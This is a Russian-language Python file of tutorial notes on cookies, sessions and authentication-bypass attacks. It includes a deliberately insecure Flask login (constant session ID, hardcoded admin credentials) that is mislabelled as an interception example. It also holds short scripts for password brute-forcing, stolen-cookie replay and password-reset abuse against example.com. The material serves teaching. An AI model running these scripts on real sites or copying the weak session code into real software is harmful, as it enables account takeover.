# =====================================================================================================================================
# Сессии и куки - это механизмы, используемые для отслеживания состояния и управления пользователями в веб-приложениях. 
# Поскольку НТТР-протокол является stateless (без сохранения состояния), для реализа­ции постоянного взаимодействия между клиентом и 
# сервером необходимо использовать дополнительные средства. Сессии и куки играют важную роль в этом процессе.

# Куки (cookies) - это небольшие фрагменты данных, которые сервер отправляет клиенту (обычно браузеру) и которые кли­ент сохраняет. 
# Эти данные могут быть отправлены обратно на сервер при последующих запросах. Куки используются для хра­нения информации о 
# пользователе и его взаимодействиях с сайтом.
# =======================================================================================================================================

# Атрибуты куки
# name - имя куки.
# value - значение куки.
# clomaiп - домен, для которого куки действительны.
# path - путь, для которого куки действительны.
# expires - дата истечения срока действия куки.
# secure - если установлен, куки передаются только по защищенному соединению HTTPS.
# HttpOпly - если установлен, куки доступны только для HTTP(S) и не доступны для JavaScript.

# Сессии - это способ сохранения состояния пользователя на сервере. Сессия начинается, когда пользователь впервые взаимодействует с 
# веб-приложением, и продолжается до тех пор, пока пользователь не выйдет из системы или сессия не истечет по времени.

# Атаки на сессии и куки - это методы, используемые злоумышленниками для получения несанкционированного доступа к сеансам пользователей и 
# украденным данным, хранящимся в куки (cookie) браузера. Сеансы и куки являются ключевыми аспектами веб-разработки, поскольку они позволяют
# веб-сайтам сохранять состояние между запросами пользователя и автоматически аутентифицировать пользователей.

# ===================================== Перехват и изменение данных сессий =======================================================

# Перехват и изменение данных сессий - это одна из разновидностей атак на сеансы, когда злоумышленники перехватывают трафик между клиентом и 
# сервером, где передаются сессион­ные данные, и изменяют их содержимое для получения несанк­ ционированного доступа или проведения других 
# вредоносных действий.

# Перехват и изменение данных сессий - это критическая уязвимость, которая может возникнуть при работе с сессиями пользователей в веб-приложениях.

# пример, как злоумышленник может перехватить и изменить данные сессии на Python
from flask import Flask, request, render_template, make_response
app = Flask(__name__)

# Временное хранилище для сессионных данных (для примера)
session_data = {}
@app.route('/login', methods = ['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Проверка аутентификации (пример)
        if username == 'admin' and password == 'password':

            # Создание новой сессии для пользователя
            session_id = generate_session_id()
            session_data[session_id] = {'username': username}

            # Установка куки с идентификатором сеанса
            response = make_response('Bы успешно вошли в систему!')
            response.set_cookie('session_id', session_id)
            return response
        else:
            return "Неверное имя пользователя или пароль!"
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    # Проверка наличия куки с идентификатором сеанса
    session_id = request.cookies.get('session_id')
    if session_id in session_data:
        # Получение данных сессии для текущего пользователя
        username = session_data[session_id] ['username']
        return f"Добро пожаловать, {username} ! "
    else:
        return "Доступ запрещен. Пожалуйста, войдите в систему."

def generate_session_id():
    # В реальном приложении генерация уникального идентификатора сеанса может быть сложнее
    return 'random session id'

if __name__=='__main__':
    app.run(debug = True)

# =========================================== Методы обхода механизмов аутентификации ================================================

# Методы обхода механизмов аутентификации - это техники, используемые злоумышленниками для обхода или обмана ме­ханизмов аутентификации, 
# предназначенных для защиты систе­мы или приложения. Эти методы позволяют злоумышленникам получить несанкционированный доступ к системе или данным,
# минуя процесс аутентификации, который предполагается защи­щенным.

# 1. Злоумышленники могут использовать скрипты на Python для перебора паролей на основе словаря ( dictionary-based password cracking) 
# или ме­тодов грубой силы (brute-force attacks) для взлома учетных записей с ис­пользованием наиболее распространенных или слабых паролей. 
# Пример скрипта на Python для перебора паролей с использованием библиотеки requests:

# Пример скрипта на Python для перебора паролей с использованием библиотеки requests
import requests

url = "https://example.com/login"
usernames = [ "admin", "root"]
passwords = [ "password", "123456", "admin123"]

for username in usernames:
    for password in passwords:
        payload = { 'username': username, 'password': password}
        response = requests.post(url, data = payload)
        if "Login successful" in response.text:
            print(f"Login successful! Username: {username}, Password: {password}")

# 2. Злоумышленники могут использовать известные уязвимости в механиз­мах аутентификации, такие как отсутствие защиты от перебора паролей,
# недостаточная длина сеансовых идентификаторов или отсутствие защи­ты от атак по перебору. Пример использования уязвимости в недостаточ­но 
# защищенном механизме аутентификации на Python:

# Пример использования уязвимости в недостаточно защищенном механизме аутентификации на Python
import requests

url = "https://example.com/admin"
session_id = "aabbccddeeff" # Перехваченный или украденный сеансовый идентификатор

cookies = {'session_id': session_id}
response = requests.get(url, cookies = cookies)

if "Admin Panel" in response.text:
    print("Access granted to admin panel!")

# 3. Злоумышленники могут использовать различные методы перехвата или подмены сеансовых идентификаторов, например с помошью атаки на 
# перехват сетевого трафика или через уязвимости в самом приложении. Пример перехвата и изменения сеансового идентификатора на Python с
# использованием библиотеки requests:

# Пример перехвата и изменения сеансового идентификатора на Python с использованием библиотеки requests
import requests
url = "https://example.com/profile"
new_session_id = "new session id here" # Новый сеансовый идентификатор

cookies = {'session id': new_session_id}
response = requests.get(url, cookies = cookies)

if "User profile" in response.text:
    print("Access granted to user profile!")

# 4. Злоумышленники могут использовать механизмы восстановления паро­ лей для получения доступа к учетной записи пользователя путем 
# перехвата или подмены сгенерированных временных паролей или ссылок для сброса пароля. Пример атаки на слабо защишенный механизм восстанов­ления 
# паролей на Python:

# Пример атаки на слабо защищенный механизм восстановления паролей на Python
import requests

url = "https://example.com/reset_password"
user_id = "user_id_here" # ID пользователя

new_password = "new_password_here" # Новый пароль

payload = {'user_id': user_id, 'new password': new_password}
response = requests.post(url, data = payload)

if "Password reset successful" in response.text:
    print("Password reset successful!")